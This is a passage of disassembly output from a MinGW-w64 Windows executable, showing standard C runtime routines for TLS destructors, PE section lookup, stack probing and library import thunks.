  407e1f:	48 83 c4 28          	add    $0x28,%rsp
  407e23:	5b                   	pop    %rbx
  407e24:	5e                   	pop    %rsi
  407e25:	5f                   	pop    %rdi
  407e26:	5d                   	pop    %rbp
  407e27:	c3                   	ret
  407e28:	be ff ff ff ff       	mov    $0xffffffff,%esi
  407e2d:	eb 9a                	jmp    407dc9 <___w64_mingwthr_add_key_dtor+0x19>
  407e2f:	90                   	nop

0000000000407e30 <___w64_mingwthr_remove_key_dtor>:
  407e30:	53                   	push   %rbx
  407e31:	48 83 ec 20          	sub    $0x20,%rsp
  407e35:	8b 05 ad 6c 02 00    	mov    0x26cad(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407e3b:	85 c0                	test   %eax,%eax
  407e3d:	89 cb                	mov    %ecx,%ebx
  407e3f:	75 0f                	jne    407e50 <___w64_mingwthr_remove_key_dtor+0x20>
  407e41:	31 c0                	xor    %eax,%eax
  407e43:	48 83 c4 20          	add    $0x20,%rsp
  407e47:	5b                   	pop    %rbx
  407e48:	c3                   	ret
  407e49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  407e50:	48 8d 0d a9 6c 02 00 	lea    0x26ca9(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407e57:	ff 15 0f 04 04 00    	call   *0x4040f(%rip)        # 44826c <__imp_EnterCriticalSection>
  407e5d:	48 8b 05 7c 6c 02 00 	mov    0x26c7c(%rip),%rax        # 42eae0 <key_dtor_list>
  407e64:	48 85 c0             	test   %rax,%rax
  407e67:	74 1a                	je     407e83 <___w64_mingwthr_remove_key_dtor+0x53>
  407e69:	8b 10                	mov    (%rax),%edx
  407e6b:	39 d3                	cmp    %edx,%ebx
  407e6d:	75 0b                	jne    407e7a <___w64_mingwthr_remove_key_dtor+0x4a>
  407e6f:	eb 4f                	jmp    407ec0 <___w64_mingwthr_remove_key_dtor+0x90>
  407e71:	8b 11                	mov    (%rcx),%edx
  407e73:	39 da                	cmp    %ebx,%edx
  407e75:	74 29                	je     407ea0 <___w64_mingwthr_remove_key_dtor+0x70>
  407e77:	48 89 c8             	mov    %rcx,%rax
  407e7a:	48 8b 48 10          	mov    0x10(%rax),%rcx
  407e7e:	48 85 c9             	test   %rcx,%rcx
  407e81:	75 ee                	jne    407e71 <___w64_mingwthr_remove_key_dtor+0x41>
  407e83:	48 8d 0d 76 6c 02 00 	lea    0x26c76(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407e8a:	ff 15 2c 04 04 00    	call   *0x4042c(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  407e90:	31 c0                	xor    %eax,%eax
  407e92:	48 83 c4 20          	add    $0x20,%rsp
  407e96:	5b                   	pop    %rbx
  407e97:	c3                   	ret
  407e98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  407e9f:	00 
  407ea0:	48 8b 51 10          	mov    0x10(%rcx),%rdx
  407ea4:	48 89 50 10          	mov    %rdx,0x10(%rax)
  407ea8:	e8 7b 05 00 00       	call   408428 <free>
  407ead:	48 8d 0d 4c 6c 02 00 	lea    0x26c4c(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407eb4:	ff 15 02 04 04 00    	call   *0x40402(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  407eba:	eb d4                	jmp    407e90 <___w64_mingwthr_remove_key_dtor+0x60>
  407ebc:	0f 1f 40 00          	nopl   0x0(%rax)
  407ec0:	48 8b 50 10          	mov    0x10(%rax),%rdx
  407ec4:	48 89 c1             	mov    %rax,%rcx
  407ec7:	48 89 15 12 6c 02 00 	mov    %rdx,0x26c12(%rip)        # 42eae0 <key_dtor_list>
  407ece:	eb d8                	jmp    407ea8 <___w64_mingwthr_remove_key_dtor+0x78>

0000000000407ed0 <__mingw_TLScallback>:
  407ed0:	53                   	push   %rbx
  407ed1:	48 83 ec 20          	sub    $0x20,%rsp
  407ed5:	83 fa 01             	cmp    $0x1,%edx
  407ed8:	0f 84 92 00 00 00    	je     407f70 <__mingw_TLScallback+0xa0>
  407ede:	72 30                	jb     407f10 <__mingw_TLScallback+0x40>
  407ee0:	83 fa 02             	cmp    $0x2,%edx
  407ee3:	74 1b                	je     407f00 <__mingw_TLScallback+0x30>
  407ee5:	83 fa 03             	cmp    $0x3,%edx
  407ee8:	75 1b                	jne    407f05 <__mingw_TLScallback+0x35>
  407eea:	8b 05 f8 6b 02 00    	mov    0x26bf8(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407ef0:	85 c0                	test   %eax,%eax
  407ef2:	74 11                	je     407f05 <__mingw_TLScallback+0x35>
  407ef4:	e8 47 fe ff ff       	call   407d40 <__mingwthr_run_key_dtors.part.0>
  407ef9:	eb 0a                	jmp    407f05 <__mingw_TLScallback+0x35>
  407efb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  407f00:	e8 fb f4 ff ff       	call   407400 <_fpreset>
  407f05:	b8 01 00 00 00       	mov    $0x1,%eax
  407f0a:	48 83 c4 20          	add    $0x20,%rsp
  407f0e:	5b                   	pop    %rbx
  407f0f:	c3                   	ret
  407f10:	8b 05 d2 6b 02 00    	mov    0x26bd2(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407f16:	85 c0                	test   %eax,%eax
  407f18:	0f 85 82 00 00 00    	jne    407fa0 <__mingw_TLScallback+0xd0>
  407f1e:	8b 05 c4 6b 02 00    	mov    0x26bc4(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407f24:	83 f8 01             	cmp    $0x1,%eax
  407f27:	75 dc                	jne    407f05 <__mingw_TLScallback+0x35>
  407f29:	48 8b 0d b0 6b 02 00 	mov    0x26bb0(%rip),%rcx        # 42eae0 <key_dtor_list>
  407f30:	48 85 c9             	test   %rcx,%rcx
  407f33:	74 11                	je     407f46 <__mingw_TLScallback+0x76>
  407f35:	48 8b 59 10          	mov    0x10(%rcx),%rbx
  407f39:	e8 ea 04 00 00       	call   408428 <free>
  407f3e:	48 85 db             	test   %rbx,%rbx
  407f41:	48 89 d9             	mov    %rbx,%rcx
  407f44:	75 ef                	jne    407f35 <__mingw_TLScallback+0x65>
  407f46:	48 8d 0d b3 6b 02 00 	lea    0x26bb3(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407f4d:	48 c7 05 88 6b 02 00 	movq   $0x0,0x26b88(%rip)        # 42eae0 <key_dtor_list>
  407f54:	00 00 00 00 
  407f58:	c7 05 86 6b 02 00 00 	movl   $0x0,0x26b86(%rip)        # 42eae8 <__mingwthr_cs_init>
  407f5f:	00 00 00 
  407f62:	ff 15 fc 02 04 00    	call   *0x402fc(%rip)        # 448264 <__IAT_start__>
  407f68:	eb 9b                	jmp    407f05 <__mingw_TLScallback+0x35>
  407f6a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  407f70:	8b 05 72 6b 02 00    	mov    0x26b72(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407f76:	85 c0                	test   %eax,%eax
  407f78:	74 16                	je     407f90 <__mingw_TLScallback+0xc0>
  407f7a:	c7 05 64 6b 02 00 01 	movl   $0x1,0x26b64(%rip)        # 42eae8 <__mingwthr_cs_init>
  407f81:	00 00 00 
  407f84:	b8 01 00 00 00       	mov    $0x1,%eax
  407f89:	48 83 c4 20          	add    $0x20,%rsp
  407f8d:	5b                   	pop    %rbx
  407f8e:	c3                   	ret
  407f8f:	90                   	nop
  407f90:	48 8d 0d 69 6b 02 00 	lea    0x26b69(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407f97:	ff 15 17 03 04 00    	call   *0x40317(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  407f9d:	eb db                	jmp    407f7a <__mingw_TLScallback+0xaa>
  407f9f:	90                   	nop
  407fa0:	e8 9b fd ff ff       	call   407d40 <__mingwthr_run_key_dtors.part.0>
  407fa5:	e9 74 ff ff ff       	jmp    407f1e <__mingw_TLScallback+0x4e>
  407faa:	90                   	nop
  407fab:	90                   	nop
  407fac:	90                   	nop
  407fad:	90                   	nop
  407fae:	90                   	nop
  407faf:	90                   	nop

0000000000407fb0 <_ValidateImageBase.part.0>:
  407fb0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  407fb4:	48 01 c1             	add    %rax,%rcx
  407fb7:	31 c0                	xor    %eax,%eax
  407fb9:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
  407fbf:	74 01                	je     407fc2 <_ValidateImageBase.part.0+0x12>
  407fc1:	c3                   	ret
  407fc2:	31 c0                	xor    %eax,%eax
  407fc4:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
  407fca:	0f 94 c0             	sete   %al
  407fcd:	c3                   	ret
  407fce:	66 90                	xchg   %ax,%ax

0000000000407fd0 <_ValidateImageBase>:
  407fd0:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  407fd5:	74 09                	je     407fe0 <_ValidateImageBase+0x10>
  407fd7:	31 c0                	xor    %eax,%eax
  407fd9:	c3                   	ret
  407fda:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  407fe0:	eb ce                	jmp    407fb0 <_ValidateImageBase.part.0>
  407fe2:	0f 1f 40 00          	nopl   0x0(%rax)
  407fe6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  407fed:	00 00 00 

0000000000407ff0 <_FindPESection>:
  407ff0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  407ff4:	48 01 c1             	add    %rax,%rcx
  407ff7:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  407ffb:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
  408000:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  408004:	85 c9                	test   %ecx,%ecx
  408006:	74 29                	je     408031 <_FindPESection+0x41>
  408008:	83 e9 01             	sub    $0x1,%ecx
  40800b:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  40800f:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
  408014:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  408018:	49 39 d0             	cmp    %rdx,%r8
  40801b:	4c 89 c1             	mov    %r8,%rcx
  40801e:	77 08                	ja     408028 <_FindPESection+0x38>
  408020:	03 48 08             	add    0x8(%rax),%ecx
  408023:	48 39 d1             	cmp    %rdx,%rcx
  408026:	77 0b                	ja     408033 <_FindPESection+0x43>
  408028:	48 83 c0 28          	add    $0x28,%rax
  40802c:	4c 39 c8             	cmp    %r9,%rax
  40802f:	75 e3                	jne    408014 <_FindPESection+0x24>
  408031:	31 c0                	xor    %eax,%eax
  408033:	c3                   	ret
  408034:	66 90                	xchg   %ax,%ax
  408036:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40803d:	00 00 00 

0000000000408040 <_FindPESectionByName>:
  408040:	57                   	push   %rdi
  408041:	56                   	push   %rsi
  408042:	53                   	push   %rbx
  408043:	48 83 ec 20          	sub    $0x20,%rsp
  408047:	48 89 ce             	mov    %rcx,%rsi
  40804a:	e8 a9 03 00 00       	call   4083f8 <strlen>
  40804f:	48 83 f8 08          	cmp    $0x8,%rax
  408053:	77 6b                	ja     4080c0 <_FindPESectionByName+0x80>
  408055:	48 8b 15 a4 9c 00 00 	mov    0x9ca4(%rip),%rdx        # 411d00 <.refptr.__image_base__>
  40805c:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
  408061:	75 5d                	jne    4080c0 <_FindPESectionByName+0x80>
  408063:	48 89 d1             	mov    %rdx,%rcx
  408066:	e8 45 ff ff ff       	call   407fb0 <_ValidateImageBase.part.0>
  40806b:	85 c0                	test   %eax,%eax
  40806d:	74 51                	je     4080c0 <_FindPESectionByName+0x80>
  40806f:	48 63 4a 3c          	movslq 0x3c(%rdx),%rcx
  408073:	48 01 d1             	add    %rdx,%rcx
  408076:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  40807a:	48 8d 5c 01 18       	lea    0x18(%rcx,%rax,1),%rbx
  40807f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
  408083:	85 c0                	test   %eax,%eax
  408085:	74 39                	je     4080c0 <_FindPESectionByName+0x80>
  408087:	83 e8 01             	sub    $0x1,%eax
  40808a:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40808e:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
  408093:	eb 09                	jmp    40809e <_FindPESectionByName+0x5e>
  408095:	48 83 c3 28          	add    $0x28,%rbx
  408099:	48 39 fb             	cmp    %rdi,%rbx
  40809c:	74 22                	je     4080c0 <_FindPESectionByName+0x80>
  40809e:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  4080a4:	48 89 f2             	mov    %rsi,%rdx
  4080a7:	48 89 d9             	mov    %rbx,%rcx
  4080aa:	e8 41 03 00 00       	call   4083f0 <strncmp>
  4080af:	85 c0                	test   %eax,%eax
  4080b1:	75 e2                	jne    408095 <_FindPESectionByName+0x55>
  4080b3:	48 89 d8             	mov    %rbx,%rax
  4080b6:	48 83 c4 20          	add    $0x20,%rsp
  4080ba:	5b                   	pop    %rbx
  4080bb:	5e                   	pop    %rsi
  4080bc:	5f                   	pop    %rdi
  4080bd:	c3                   	ret
  4080be:	66 90                	xchg   %ax,%ax
  4080c0:	31 db                	xor    %ebx,%ebx
  4080c2:	48 89 d8             	mov    %rbx,%rax
  4080c5:	48 83 c4 20          	add    $0x20,%rsp
  4080c9:	5b                   	pop    %rbx
  4080ca:	5e                   	pop    %rsi
  4080cb:	5f                   	pop    %rdi
  4080cc:	c3                   	ret
  4080cd:	0f 1f 00             	nopl   (%rax)

00000000004080d0 <__mingw_GetSectionForAddress>:
  4080d0:	48 83 ec 28          	sub    $0x28,%rsp
  4080d4:	4c 8b 05 25 9c 00 00 	mov    0x9c25(%rip),%r8        # 411d00 <.refptr.__image_base__>
  4080db:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
  4080e1:	48 89 ca             	mov    %rcx,%rdx
  4080e4:	75 57                	jne    40813d <__mingw_GetSectionForAddress+0x6d>
  4080e6:	4c 89 c1             	mov    %r8,%rcx
  4080e9:	e8 c2 fe ff ff       	call   407fb0 <_ValidateImageBase.part.0>
  4080ee:	85 c0                	test   %eax,%eax
  4080f0:	74 4b                	je     40813d <__mingw_GetSectionForAddress+0x6d>
  4080f2:	49 63 40 3c          	movslq 0x3c(%r8),%rax
  4080f6:	48 89 d1             	mov    %rdx,%rcx
  4080f9:	4c 29 c1             	sub    %r8,%rcx
  4080fc:	49 01 c0             	add    %rax,%r8
  4080ff:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
  408104:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
  408109:	85 d2                	test   %edx,%edx
  40810b:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
  408110:	74 2b                	je     40813d <__mingw_GetSectionForAddress+0x6d>
  408112:	83 ea 01             	sub    $0x1,%edx
  408115:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  408119:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
  40811e:	66 90                	xchg   %ax,%ax
  408120:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  408124:	4c 39 c1             	cmp    %r8,%rcx
  408127:	4c 89 c2             	mov    %r8,%rdx
  40812a:	72 08                	jb     408134 <__mingw_GetSectionForAddress+0x64>
  40812c:	03 50 08             	add    0x8(%rax),%edx
  40812f:	48 39 d1             	cmp    %rdx,%rcx
  408132:	72 0b                	jb     40813f <__mingw_GetSectionForAddress+0x6f>
  408134:	48 83 c0 28          	add    $0x28,%rax
  408138:	4c 39 c8             	cmp    %r9,%rax
  40813b:	75 e3                	jne    408120 <__mingw_GetSectionForAddress+0x50>
  40813d:	31 c0                	xor    %eax,%eax
  40813f:	48 83 c4 28          	add    $0x28,%rsp
  408143:	c3                   	ret
  408144:	66 90                	xchg   %ax,%ax
  408146:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40814d:	00 00 00 

0000000000408150 <__mingw_GetSectionCount>:
  408150:	48 83 ec 28          	sub    $0x28,%rsp
  408154:	48 8b 15 a5 9b 00 00 	mov    0x9ba5(%rip),%rdx        # 411d00 <.refptr.__image_base__>
  40815b:	45 31 c0             	xor    %r8d,%r8d
  40815e:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
  408163:	74 0b                	je     408170 <__mingw_GetSectionCount+0x20>
  408165:	44 89 c0             	mov    %r8d,%eax
  408168:	48 83 c4 28          	add    $0x28,%rsp
  40816c:	c3                   	ret
  40816d:	0f 1f 00             	nopl   (%rax)
  408170:	48 89 d1             	mov    %rdx,%rcx
  408173:	e8 38 fe ff ff       	call   407fb0 <_ValidateImageBase.part.0>
  408178:	85 c0                	test   %eax,%eax
  40817a:	74 e9                	je     408165 <__mingw_GetSectionCount+0x15>
  40817c:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
  408180:	44 0f b7 44 10 06    	movzwl 0x6(%rax,%rdx,1),%r8d
  408186:	44 89 c0             	mov    %r8d,%eax
  408189:	48 83 c4 28          	add    $0x28,%rsp
  40818d:	c3                   	ret
  40818e:	66 90                	xchg   %ax,%ax

0000000000408190 <_FindPESectionExec>:
  408190:	48 83 ec 28          	sub    $0x28,%rsp
  408194:	4c 8b 05 65 9b 00 00 	mov    0x9b65(%rip),%r8        # 411d00 <.refptr.__image_base__>
  40819b:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
  4081a1:	48 89 ca             	mov    %rcx,%rdx
  4081a4:	75 52                	jne    4081f8 <_FindPESectionExec+0x68>
  4081a6:	4c 89 c1             	mov    %r8,%rcx
  4081a9:	e8 02 fe ff ff       	call   407fb0 <_ValidateImageBase.part.0>
  4081ae:	85 c0                	test   %eax,%eax
  4081b0:	74 46                	je     4081f8 <_FindPESectionExec+0x68>
  4081b2:	49 63 48 3c          	movslq 0x3c(%r8),%rcx
  4081b6:	4c 01 c1             	add    %r8,%rcx
  4081b9:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  4081bd:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
  4081c2:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  4081c6:	85 c9                	test   %ecx,%ecx
  4081c8:	74 2e                	je     4081f8 <_FindPESectionExec+0x68>
  4081ca:	83 e9 01             	sub    $0x1,%ecx
  4081cd:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  4081d1:	48 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%rcx
  4081d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4081dd:	00 00 00 
  4081e0:	f6 40 27 20          	testb  $0x20,0x27(%rax)
  4081e4:	74 09                	je     4081ef <_FindPESectionExec+0x5f>
  4081e6:	48 85 d2             	test   %rdx,%rdx
  4081e9:	74 0f                	je     4081fa <_FindPESectionExec+0x6a>
  4081eb:	48 83 ea 01          	sub    $0x1,%rdx
  4081ef:	48 83 c0 28          	add    $0x28,%rax
  4081f3:	48 39 c8             	cmp    %rcx,%rax
  4081f6:	75 e8                	jne    4081e0 <_FindPESectionExec+0x50>
  4081f8:	31 c0                	xor    %eax,%eax
  4081fa:	48 83 c4 28          	add    $0x28,%rsp
  4081fe:	c3                   	ret
  4081ff:	90                   	nop

0000000000408200 <_GetPEImageBase>:
  408200:	48 83 ec 28          	sub    $0x28,%rsp
  408204:	48 8b 15 f5 9a 00 00 	mov    0x9af5(%rip),%rdx        # 411d00 <.refptr.__image_base__>
  40820b:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
  408210:	75 1e                	jne    408230 <_GetPEImageBase+0x30>
  408212:	48 89 d1             	mov    %rdx,%rcx
  408215:	e8 96 fd ff ff       	call   407fb0 <_ValidateImageBase.part.0>
  40821a:	85 c0                	test   %eax,%eax
  40821c:	b8 00 00 00 00       	mov    $0x0,%eax
  408221:	48 0f 45 c2          	cmovne %rdx,%rax
  408225:	48 83 c4 28          	add    $0x28,%rsp
  408229:	c3                   	ret
  40822a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  408230:	31 c0                	xor    %eax,%eax
  408232:	48 83 c4 28          	add    $0x28,%rsp
  408236:	c3                   	ret
  408237:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40823e:	00 00 

0000000000408240 <_IsNonwritableInCurrentImage>:
  408240:	48 83 ec 28          	sub    $0x28,%rsp
  408244:	4c 8b 05 b5 9a 00 00 	mov    0x9ab5(%rip),%r8        # 411d00 <.refptr.__image_base__>
  40824b:	31 c0                	xor    %eax,%eax
  40824d:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
  408253:	48 89 ca             	mov    %rcx,%rdx
  408256:	74 08                	je     408260 <_IsNonwritableInCurrentImage+0x20>
  408258:	48 83 c4 28          	add    $0x28,%rsp
  40825c:	c3                   	ret
  40825d:	0f 1f 00             	nopl   (%rax)
  408260:	4c 89 c1             	mov    %r8,%rcx
  408263:	e8 48 fd ff ff       	call   407fb0 <_ValidateImageBase.part.0>
  408268:	85 c0                	test   %eax,%eax
  40826a:	74 ec                	je     408258 <_IsNonwritableInCurrentImage+0x18>
  40826c:	49 63 40 3c          	movslq 0x3c(%r8),%rax
  408270:	48 89 d1             	mov    %rdx,%rcx
  408273:	4c 29 c1             	sub    %r8,%rcx
  408276:	49 01 c0             	add    %rax,%r8
  408279:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
  40827e:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
  408283:	85 d2                	test   %edx,%edx
  408285:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
  40828a:	74 31                	je     4082bd <_IsNonwritableInCurrentImage+0x7d>
  40828c:	83 ea 01             	sub    $0x1,%edx
  40828f:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  408293:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
  408298:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40829f:	00 
  4082a0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  4082a4:	4c 39 c1             	cmp    %r8,%rcx
  4082a7:	4c 89 c2             	mov    %r8,%rdx
  4082aa:	72 08                	jb     4082b4 <_IsNonwritableInCurrentImage+0x74>
  4082ac:	03 50 08             	add    0x8(%rax),%edx
  4082af:	48 39 d1             	cmp    %rdx,%rcx
  4082b2:	72 10                	jb     4082c4 <_IsNonwritableInCurrentImage+0x84>
  4082b4:	48 83 c0 28          	add    $0x28,%rax
  4082b8:	4c 39 c8             	cmp    %r9,%rax
  4082bb:	75 e3                	jne    4082a0 <_IsNonwritableInCurrentImage+0x60>
  4082bd:	31 c0                	xor    %eax,%eax
  4082bf:	48 83 c4 28          	add    $0x28,%rsp
  4082c3:	c3                   	ret
  4082c4:	8b 40 24             	mov    0x24(%rax),%eax
  4082c7:	f7 d0                	not    %eax
  4082c9:	c1 e8 1f             	shr    $0x1f,%eax
  4082cc:	48 83 c4 28          	add    $0x28,%rsp
  4082d0:	c3                   	ret
  4082d1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4082d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4082dd:	00 00 00 

00000000004082e0 <__mingw_enum_import_library_names>:
  4082e0:	48 83 ec 28          	sub    $0x28,%rsp
  4082e4:	4c 8b 1d 15 9a 00 00 	mov    0x9a15(%rip),%r11        # 411d00 <.refptr.__image_base__>
  4082eb:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
  4082f1:	41 89 c9             	mov    %ecx,%r9d
  4082f4:	75 58                	jne    40834e <__mingw_enum_import_library_names+0x6e>
  4082f6:	4c 89 d9             	mov    %r11,%rcx
  4082f9:	e8 b2 fc ff ff       	call   407fb0 <_ValidateImageBase.part.0>
  4082fe:	85 c0                	test   %eax,%eax
  408300:	74 4c                	je     40834e <__mingw_enum_import_library_names+0x6e>
  408302:	49 63 43 3c          	movslq 0x3c(%r11),%rax
  408306:	4c 01 d8             	add    %r11,%rax
  408309:	8b 90 90 00 00 00    	mov    0x90(%rax),%edx
  40830f:	85 d2                	test   %edx,%edx
  408311:	74 3b                	je     40834e <__mingw_enum_import_library_names+0x6e>
  408313:	0f b7 48 14          	movzwl 0x14(%rax),%ecx
  408317:	48 8d 4c 08 18       	lea    0x18(%rax,%rcx,1),%rcx
  40831c:	0f b7 40 06          	movzwl 0x6(%rax),%eax
  408320:	85 c0                	test   %eax,%eax
  408322:	74 2a                	je     40834e <__mingw_enum_import_library_names+0x6e>
  408324:	83 e8 01             	sub    $0x1,%eax
  408327:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40832b:	48 8d 44 c1 28       	lea    0x28(%rcx,%rax,8),%rax
  408330:	44 8b 51 0c          	mov    0xc(%rcx),%r10d
  408334:	4c 39 d2             	cmp    %r10,%rdx
  408337:	4d 89 d0             	mov    %r10,%r8
  40833a:	72 09                	jb     408345 <__mingw_enum_import_library_names+0x65>
  40833c:	44 03 41 08          	add    0x8(%rcx),%r8d
  408340:	4c 39 c2             	cmp    %r8,%rdx
  408343:	72 10                	jb     408355 <__mingw_enum_import_library_names+0x75>
  408345:	48 83 c1 28          	add    $0x28,%rcx
  408349:	48 39 c1             	cmp    %rax,%rcx
  40834c:	75 e2                	jne    408330 <__mingw_enum_import_library_names+0x50>
  40834e:	31 c0                	xor    %eax,%eax
  408350:	48 83 c4 28          	add    $0x28,%rsp
  408354:	c3                   	ret
  408355:	4c 01 da             	add    %r11,%rdx
  408358:	75 0e                	jne    408368 <__mingw_enum_import_library_names+0x88>
  40835a:	eb f2                	jmp    40834e <__mingw_enum_import_library_names+0x6e>
  40835c:	0f 1f 40 00          	nopl   0x0(%rax)
  408360:	41 83 e9 01          	sub    $0x1,%r9d
  408364:	48 83 c2 14          	add    $0x14,%rdx
  408368:	8b 4a 04             	mov    0x4(%rdx),%ecx
  40836b:	85 c9                	test   %ecx,%ecx
  40836d:	75 07                	jne    408376 <__mingw_enum_import_library_names+0x96>
  40836f:	8b 42 0c             	mov    0xc(%rdx),%eax
  408372:	85 c0                	test   %eax,%eax
  408374:	74 d8                	je     40834e <__mingw_enum_import_library_names+0x6e>
  408376:	45 85 c9             	test   %r9d,%r9d
  408379:	7f e5                	jg     408360 <__mingw_enum_import_library_names+0x80>
  40837b:	8b 42 0c             	mov    0xc(%rdx),%eax
  40837e:	4c 01 d8             	add    %r11,%rax
  408381:	48 83 c4 28          	add    $0x28,%rsp
  408385:	c3                   	ret
  408386:	90                   	nop
  408387:	90                   	nop
  408388:	90                   	nop
  408389:	90                   	nop
  40838a:	90                   	nop
  40838b:	90                   	nop
  40838c:	90                   	nop
  40838d:	90                   	nop
  40838e:	90                   	nop
  40838f:	90                   	nop

0000000000408390 <___chkstk_ms>:
  408390:	51                   	push   %rcx
  408391:	50                   	push   %rax
  408392:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  408398:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
  40839d:	72 19                	jb     4083b8 <___chkstk_ms+0x28>
  40839f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
  4083a6:	48 83 09 00          	orq    $0x0,(%rcx)
  4083aa:	48 2d 00 10 00 00    	sub    $0x1000,%rax
  4083b0:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  4083b6:	77 e7                	ja     40839f <___chkstk_ms+0xf>
  4083b8:	48 29 c1             	sub    %rax,%rcx
  4083bb:	48 83 09 00          	orq    $0x0,(%rcx)
  4083bf:	58                   	pop    %rax
  4083c0:	59                   	pop    %rcx
  4083c1:	c3                   	ret
  4083c2:	90                   	nop
  4083c3:	90                   	nop
  4083c4:	90                   	nop
  4083c5:	90                   	nop
  4083c6:	90                   	nop
  4083c7:	90                   	nop
  4083c8:	90                   	nop
  4083c9:	90                   	nop
  4083ca:	90                   	nop
  4083cb:	90                   	nop
  4083cc:	90                   	nop
  4083cd:	90                   	nop
  4083ce:	90                   	nop
  4083cf:	90                   	nop

00000000004083d0 <mingw_getsp>:
  4083d0:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
  4083d5:	c3                   	ret

00000000004083d6 <longjmp>:
  4083d6:	48 8d 05 4f 00 04 00 	lea    0x4004f(%rip),%rax        # 44842c <__imp_longjmp>
  4083dd:	ff 20                	jmp    *(%rax)
  4083df:	90                   	nop

00000000004083e0 <wcschr>:
  4083e0:	ff 25 96 00 04 00    	jmp    *0x40096(%rip)        # 44847c <__imp_wcschr>
  4083e6:	90                   	nop
  4083e7:	90                   	nop

00000000004083e8 <vfprintf>:
  4083e8:	ff 25 86 00 04 00    	jmp    *0x40086(%rip)        # 448474 <__imp_vfprintf>
  4083ee:	90                   	nop
  4083ef:	90                   	nop

00000000004083f0 <strncmp>:
  4083f0:	ff 25 76 00 04 00    	jmp    *0x40076(%rip)        # 44846c <__imp_strncmp>
  4083f6:	90                   	nop
  4083f7:	90                   	nop

00000000004083f8 <strlen>:
  4083f8:	ff 25 66 00 04 00    	jmp    *0x40066(%rip)        # 448464 <__imp_strlen>
  4083fe:	90                   	nop
  4083ff:	90                   	nop

0000000000408400 <signal>:
  408400:	ff 25 56 00 04 00    	jmp    *0x40056(%rip)        # 44845c <__imp_signal>
  408406:	90                   	nop
  408407:	90                   	nop

0000000000408408 <memcpy>:
  408408:	ff 25 3e 00 04 00    	jmp    *0x4003e(%rip)        # 44844c <__imp_memcpy>
  40840e:	90                   	nop
  40840f:	90                   	nop

0000000000408410 <malloc>:
